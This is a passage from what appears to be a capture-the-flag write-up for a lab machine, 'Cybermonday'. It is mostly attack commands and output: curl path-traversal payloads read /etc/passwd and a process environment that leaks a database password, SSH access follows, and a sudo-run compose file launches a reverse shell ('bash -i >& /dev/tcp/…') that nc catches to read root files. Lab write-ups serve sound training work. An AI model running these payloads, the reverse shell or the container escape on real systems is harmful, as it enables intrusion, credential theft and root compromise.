+----+--------------------------------------+--------+-------------------+---------------+
| id | uuid                                 | name   | description       | action        |
+----+--------------------------------------+--------+-------------------+---------------+
|  1 | fda96d32-e8c8-4301-8fb3-c821a316cf77 | tests  | webhook for tests | createLogFile |
|  2 | ad177c8e-8a74-42bd-89c5-fd30a31a451c | foobar | foobar            | sendRequest   |
+----+--------------------------------------+--------+-------------------+---------------+
2 rows in set (0.100 sec)

MySQL [webhooks_api]> UPDATE webhooks SET name = '../var/' WHERE id = '1';
Query OK, 1 row affected (0.149 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

Modified Request:

```c
POST /webhooks/7013fb88-3f42-4a7c-b3a2-4e5b433a2cce/logs HTTP/1.1
Host: webhooks-api-beta.cybermonday.htb
Connection: close
X-API-KEY: 22892e36-1770-11ee-be56-0242ac120002
Content-Type: application/json
Content-Length: 58

{"action":"read","log_name":"log/. . / . . /etc/passwd"
}
```

curl:

```c
$ curl -sX POST 'http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77/logs' -H 'Content-Type: application/json' -H "X-API-KEY: 22892e36-1770-11ee-be56-0242ac120002" -d '{"action":"read","log_name":". . / . . /var/log/. . / . . /etc/passwd"}' | jq -r '.message'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

```c
$ curl -sX POST 'http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77/logs' -H 'Content-Type: application/json' -H "X-API-KEY: 22892e36-1770-11ee-be56-0242ac120002" -d '{"action":"list","log_name":". . / . . /var/log/. . / . . /etc"}' | jq -r '.message' 
[
  "backups",
  "cache",
  "lib",
  "local",
  "lock",
  "log",
  "mail",
  "opt",
  "run",
  "spool",
  "tmp",
  "www"
]
```

To list different files or directories, we had to update the database accordingly.

```c
MySQL [webhooks_api]> UPDATE webhooks SET name = '../' WHERE id = '1';
Query OK, 1 row affected (0.155 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

```c
$ curl -sX POST 'http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77/logs' -H 'Content-Type: application/json' -H "X-API-KEY: 22892e36-1770-11ee-be56-0242ac120002" -d '{"action":"list","log_name":". . / . . /var/log/. . / . . /etc/"}' | jq -r '.message'
[
  ".dockerenv",
  "bin",
  "boot",
  "dev",
  "etc",
  "home",
  "lib",
  "lib32",
  "lib64",
  "libx32",
  "logs",
  "media",
  "mnt",
  "opt",
  "proc",
  "root",
  "run",
  "sbin",
  "srv",
  "sys",
  "tmp",
  "usr",
  "var"
]
```

```c
MySQL [webhooks_api]> UPDATE webhooks SET name = '../proc/' WHERE id = '1';
Query OK, 1 row affected (0.190 sec)
Rows matched: 1  Changed: 1  Warnings: 0
```

```c
$ curl -sX POST 'http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77/logs' -H 'Content-Type: application/json' -H "X-API-KEY: 22892e36-1770-11ee-be56-0242ac120002" -d '{"action":"read","log_name":". . / . . /var/log/. . / . . /proc/1/environ"}' | jq -r '.message'
HOSTNAME=e1862f4e1242PHP_INI_DIR=/usr/local/etc/phpHOME=/rootPHP_LDFLAGS=-Wl,-O1 -piePHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64DBPASS=ngFfX2L71NuPHP_VERSION=8.2.7GPG_KEYS=39B641343D8C104B2B146DC3F9C39DC0B9698544 E60913E4DF209907D8E30D96659A97C9CF2A795A 1198C0117593497A5EC5C199286AF1F9897469DCPHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2 -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64PHP_ASC_URL=https://www.php.net/distributions/php-8.2.7.tar.xz.ascPHP_URL=https://www.php.net/distributions/php-8.2.7.tar.xzDBHOST=dbDBUSER=dbuserPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binDBNAME=webhooks_apiPHPIZE_DEPS=autoconf             dpkg-dev            file            g++             gcc             libc-dev                make            pkg-config              re2cPWD=/var/www/htmlPHP_SHA256=4b9fb3dcd7184fe7582d7e44544ec7c5153852a2528de3b6754791258ffbdfa0
```

| Password |
| --- |
| <--- SNIP ---> |

```c
$ ssh john@cybermonday.htb
The authenticity of host 'cybermonday.htb (10.129.114.229)' can't be established.
ED25519 key fingerprint is SHA256:KN9ev9G8u8Q4yY10fnm1hyEg8EbMvMRHxvDvCxRf6do.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'cybermonday.htb' (ED25519) to the list of known hosts.
john@cybermonday.htb's password: 
Linux cybermonday 5.10.0-24-amd64 #1 SMP Debian 5.10.179-5 (2023-08-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
john@cybermonday:~$
```

## user.txt

```c
john@cybermonday:~$ cat user.txt 
53ca13c7033b2fc39b35aea0bb080f7c
```

## Enumeration

```c
john@cybermonday:~$ id
uid=1000(john) gid=1000(john) groups=1000(john)
```

```c
john@cybermonday:~$ sudo -l
[sudo] password for john: 
Matching Defaults entries for john on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User john may run the following commands on localhost:
    (root) /opt/secure_compose.py *.yml
```

```c
john@cybermonday:~$ cat root.yml 
version: "3.0"
services:
  malicious-service:
    image: cybermonday_api
    devices:
      - /dev/sda1:/dev/sda1
    command: bash -c 'bash -i >& /dev/tcp/10.10.16.7/9001 0>&1'
```

```c
john@cybermonday:~$ sudo /opt/secure_compose.py root.yml 
Starting services...
```

```c
$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.7] from (UNKNOWN) [10.129.114.229] 60792
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@8fd774969be7:/var/www/html#
```

## root.txt

```c
root@8fd774969be7:/var/www/html# debugfs /dev/sda1
debugfs /dev/sda1
debugfs 1.47.0 (5-Feb-2023)
debugfs:  cd /root
cd /root
debugfs:  ls
ls
 20  (12) .    2  (12) ..    22  (16) .profile    23  (16) .bashrc   
 131617  (24) .local    52  (36) cybermonday    38  (40) root.txt   
 53  (3928) .bash_history   
debugfs:  cat root.txt
cat root.txt
4326d37a4a946f39b869e8ce730a67ca
```
